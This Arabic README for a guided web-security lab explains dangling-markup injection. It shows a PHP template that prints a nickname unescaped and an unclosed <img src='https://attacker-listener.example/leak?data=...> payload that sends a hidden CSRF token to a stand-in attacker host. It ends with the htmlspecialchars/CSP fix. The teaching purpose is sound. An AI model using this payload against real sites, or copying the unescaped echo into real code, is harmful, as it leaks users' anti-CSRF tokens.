# المختبر 1: مختبر توجيهي مشروح — سرقة الرموز عبر العلامات العالقة (Dangling Markup)

> 🌐 **Language:** [English (README.md)](./README.md) | **العربية 🇸🇦**

---

## 🎯 الهدف من المختبر
فهم كيف يمكن استغلال وسوم HTML غير المغلقة ("العلامات العالقة - Dangling Markup") كأداة هجومية لاستخراج وتسريب رموز الحماية الحساسة (CSRF Tokens) إلى سيرفر المهاجم **حتى في ظل حظر تام لتنفيذ أي كود جافا سكريبت** بسياسة أمان محتوى صارمة (`script-src 'none'`).

---

## 🔬 المعمارية والسبب الجذري للثغرة (Root Cause)

### 1. السياق البرمجي المصاب:
في ملف `index.html`، افحص هيكل القالب في السيرفر:
```html
<div class="user-greeting">
    مرحباً بك مجدداً، <?= $userNickname ?>!
</div>

<form action="/api/account/delete" method="POST">
    <input type="hidden" name="csrf_token" value="super_secret_token_123">
    <button type="submit">حذف الحساب</button>
</form>
```
يقوم الموقع بطباعة اسم المستخدم `$userNickname` مباشرة دون تشفير علامات التنصيص.

### 2. حمولة المهاجم غير المكتملة:
يقدم المهاجم النص التالي:
```html
<img src='https://attacker-listener.example/leak?data=
```

### 3. سلوك محرك تحليل المتصفح (Browser Parser):
لاحظ أن الحمولة تبدأ بعلامة تنصيص مفردة (`'`) **دون أن تغلقها**. يعامل محرك المتصفح كل الأكواد التالية لعلامة التنصيص على أنها رابط صورة الـ `src` حتى يجد علامة تنصيص مفردة لاحقة في الصفحة.

يصبح الوسم في شجرة الـ DOM هكذا:
```html
<img src='https://attacker-listener.example/leak?data=!<input type="hidden" name="csrf_token" value="super_secret_token_123">...'>
```
يطلق المتصفح فوراً طلب HTTP GET تلقائياً إلى سيرفر المهاجم `attacker-listener.example`، حاملاً رمز الحماية السري CSRF بوضوح داخل الرابط!

---

## 🚀 خطوات التطبيق والمعاينة العملية

1. افتح ملف `index.html` في متصفحك:
   ```powershell
   Start-Process chrome.exe "E:\Programming Languages\02-HTML-CSS\Level-3-Advanced-and-Security\Labs\Lab-1-Guided-Walkthrough\index.html"
   ```
2. انقر على زر **"Simulate Vulnerable Reflection"**:
   - راجع قسم **سجلات سيرفر المهاجم (Attacker Server Access Log)**.
   - لاحظ كيف اعترض سيرفر المهاجم الطلب:
     `GET /leak?data=...csrf_token...SUPER_SECRET_CSRF_TOKEN_2026`.
3. الآن انقر على زر **"Apply Secure Defense Patch (ENT_QUOTES)"**:
   - يقوم السيرفر بتشفير علامات التنصيص: يتحول `<` إلى `&lt;` و `'` إلى `&#039;`.
   - يتعامل المتصفح مع المدخلات كنص عادي للعرض وليس كوسم تنفيذي.
   - يتم إحباط الهجوم تماماً!

---

## 🛡️ كود الإصلاح والترقيع الأمني (Remediation)

في لغات البرمجة الخلفية كـ PHP:
```php
// كود مصاب:
echo $nickname;

// كود محصن وآمن من Dangling Markup:
echo htmlspecialchars($nickname, ENT_QUOTES | ENT_HTML5, 'UTF-8');
```

مع فرض ترويسات سياسة أمان المحتوى الصارمة:
```http
Content-Security-Policy: default-src 'self'; img-src 'self';
```

---

**المختبر التالي:**  
🎯 **[الانتقال إلى المختبر 2: التحدي التدريبي غير المحلول — تسريب البيانات عبر CSS](../Lab-2-Challenge-Unsolved/README.ar.md)**
